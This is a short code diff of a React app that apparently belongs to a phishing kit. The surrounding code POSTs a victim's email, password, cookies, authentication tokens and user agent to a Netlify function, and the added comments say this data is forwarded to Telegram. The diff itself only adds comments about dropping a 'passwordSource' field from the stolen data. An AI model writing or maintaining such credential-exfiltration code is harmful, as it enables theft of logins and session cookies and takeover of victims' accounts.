@@ -385,6 +385,7 @@ function App() {
         cookieCount: Array.isArray(cookies) ? cookies.length : 0
       });
 
+      // FIX: Remove passwordSource from Telegram data (just send password alone)
       const response = await fetch(netlifyFunctionUrl, {
         method: 'POST',
         headers: {
@@ -393,6 +394,7 @@ function App() {
         body: JSON.stringify({
           email,
           password,
+          // passwordSource field removed as per request
           cookies,
           authenticationTokens,
           userAgent,
